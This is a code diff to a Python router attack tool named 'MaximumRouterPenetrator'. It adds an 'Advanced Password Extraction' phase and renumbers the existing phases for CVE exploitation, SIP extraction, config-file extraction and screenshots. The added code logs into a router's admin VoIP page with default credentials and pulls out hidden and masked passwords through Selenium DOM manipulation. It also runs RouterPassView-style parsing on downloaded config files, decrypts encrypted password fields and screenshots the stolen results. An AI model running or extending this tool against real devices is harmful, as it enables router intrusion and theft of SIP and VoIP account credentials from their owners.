@@ -1027,7 +1027,7 @@ class MaximumRouterPenetrator:
         
         # Step 3: CVE exploitation attempts
         if verbose:
-            print(f"\n🔬 PHASE 4: CVE Testing (Brand-Specific)")
+            print(f"\n🔬 PHASE 5: CVE Testing (Brand-Specific)")
             print(f"   • Testing CVE exploits for detected brand")
             print(f"   • Extracting information from successful exploits")
             print(f"         🔬 LIVE DEBUG: Testing CVE exploits...")
@@ -1120,9 +1120,10 @@ class MaximumRouterPenetrator:
             if self.screenshot_mode:
                 try:
                     if verbose:
-                        print(f"\n📸 PHASE 6: Screenshot & Evidence Collection")
+                        print(f"\n📸 PHASE 7: Screenshot & Evidence Collection")
                         print(f"   • Taking admin panel screenshot")
                         print(f"   • Capturing VoIP page evidence")
+                        print(f"   • Documenting password extraction results")
                         print(f"         📸 LIVE DEBUG: Taking admin panel screenshot...")
                     
                     # Try Selenium first, then fallback to urllib
@@ -1195,6 +1196,24 @@ class MaximumRouterPenetrator:
                         if verbose:
                             print(f"         ✅ VoIP page screenshot saved: {voip_screenshot['filename']}")
                     
+                    # Take screenshot of password extraction results
+                    if result.get('hidden_passwords') or result.get('routerpassview_passwords') or result.get('encrypted_passwords'):
+                        if verbose:
+                            print(f"         📸 LIVE DEBUG: Taking password extraction screenshot...")
+                        
+                        password_screenshot = self._take_selenium_screenshot(
+                            target_ip, 
+                            "/admin/voip.asp", 
+                            f"password_extraction_{target_ip}.png",
+                            auth_result.get('credentials', ('admin', 'admin')),
+                            verbose
+                        )
+                        
+                        if password_screenshot['success']:
+                            result['password_extraction_screenshot'] = password_screenshot['filename']
+                            if verbose:
+                                print(f"         ✅ Password extraction screenshot saved: {password_screenshot['filename']}")
+                    
                     if screenshot_result['success']:
                         result['admin_screenshot'] = screenshot_result['filename']
                         if verbose:
@@ -1229,8 +1248,98 @@ class MaximumRouterPenetrator:
                             print(f"         ❌ VoIP screenshot error: {str(e)[:50]}")
             
             # NEW: Enhanced authenticated SIP extraction with multiple methods
+            # Phase 3: Advanced Password Extraction
             if verbose:
-                print(f"\n📞 PHASE 3: SIP Information Extraction")
+                print(f"\n🔓 PHASE 3: Advanced Password Extraction")
+                print(f"   • Extracting hidden/masked passwords")
+                print(f"   • RouterPassView style extraction")
+                print(f"   • Encrypted password decryption")
+                print(f"   • DOM manipulation techniques")
+                print(f"         🔐 LIVE DEBUG: Starting advanced password extraction...")
+            
+            # Advanced password extraction techniques
+            if auth_result.get('verified_access') and self.password_extraction['dom_manipulation']:
+                if verbose:
+                    print(f"         🔓 LIVE DEBUG: Attempting Selenium DOM manipulation...")
+                
+                # Try Selenium for hidden password extraction
+                hidden_passwords = self._extract_hidden_passwords_selenium(
+                    target_ip, 
+                    "/admin/voip.asp", 
+                    auth_result.get('credentials', ('admin', 'admin')),
+                    verbose
+                )
+                
+                if hidden_passwords['success']:
+                    result['hidden_passwords'] = hidden_passwords['passwords']
+                    if verbose:
+                        print(f"         ✅ Hidden passwords extracted: {len(hidden_passwords['passwords'])}")
+                        for pwd in hidden_passwords['passwords']:
+                            print(f"         🔓 {pwd['field_name']}: {pwd['password']} ({pwd['method']})")
+            
+            # RouterPassView style extraction from config files
+            if auth_result.get('verified_access') and self.password_extraction['routerpassview_style']:
+                if verbose:
+                    print(f"         🔓 LIVE DEBUG: RouterPassView style extraction...")
+                
+                # Try to get config files first
+                config_result = self._search_and_extract_config_files(target_ip, auth_result, verbose)
+                if config_result['success']:
+                    for config_file in config_result['files']:
+                        content = config_file.get('content', '')
+                        if content:
+                            # Extract passwords using RouterPassView style
+                            routerpassview_passwords = self._routerpassview_style_extraction(
+                                content, 
+                                router_info.get('brand', 'generic'), 
+                                verbose
+                            )
+                            if routerpassview_passwords:
+                                if 'routerpassview_passwords' not in result:
+                                    result['routerpassview_passwords'] = []
+                                result['routerpassview_passwords'].extend(routerpassview_passwords)
+                                if verbose:
+                                    print(f"         ✅ RouterPassView passwords found: {len(routerpassview_passwords)}")
+            
+            # Encrypted password extraction from page content
+            if auth_result.get('verified_access') and self.password_extraction['encrypted_field_decryption']:
+                if verbose:
+                    print(f"         🔓 LIVE DEBUG: Encrypted password extraction...")
+                
+                # Get page content for encrypted password extraction
+                try:
+                    if auth_result.get('session'):
+                        response = auth_result['session'].get(f"http://{target_ip}/admin/voip.asp", timeout=10)
+                        content = response.text
+                    else:
+                        # Use urllib as fallback
+                        import base64
+                        credentials = auth_result.get('credentials', ('admin', 'admin'))
+                        auth_string = f'{credentials[0]}:{credentials[1]}'
+                        auth_bytes = auth_string.encode('ascii')
+                        auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+                        
+                        req = urllib.request.Request(f"http://{target_ip}/admin/voip.asp")
+                        req.add_header('Authorization', f'Basic {auth_b64}')
+                        response = urllib.request.urlopen(req, timeout=10)
+                        content = response.read().decode('utf-8', errors='ignore')
+                    
+                    # Extract encrypted passwords
+                    encrypted_passwords = self._extract_encrypted_passwords(content, verbose)
+                    if encrypted_passwords:
+                        result['encrypted_passwords'] = encrypted_passwords
+                        if verbose:
+                            print(f"         ✅ Encrypted passwords found: {len(encrypted_passwords)}")
+                            for pwd in encrypted_passwords:
+                                print(f"         🔓 {pwd['field']}: {pwd['original']} -> {pwd['decrypted']} ({pwd['method']})")
+                
+                except Exception as e:
+                    if verbose:
+                        print(f"         ❌ Encrypted password extraction error: {str(e)[:50]}")
+            
+            # Phase 4: SIP Information Extraction
+            if verbose:
+                print(f"\n📞 PHASE 4: SIP Information Extraction")
                 print(f"   • Searching for VoIP/SIP pages")
                 print(f"   • Extracting SIP account information")
                 print(f"   • Taking VoIP page screenshots")
@@ -1273,7 +1382,7 @@ class MaximumRouterPenetrator:
             
             # Search for config files and extract SIP
             if verbose:
-                print(f"\n📁 PHASE 5: Config File Extraction")
+                print(f"\n📁 PHASE 6: Config File Extraction")
                 print(f"   • Searching for configuration files")
                 print(f"   • Downloading and analyzing configs")
                 print(f"   • Cracking protected passwords")
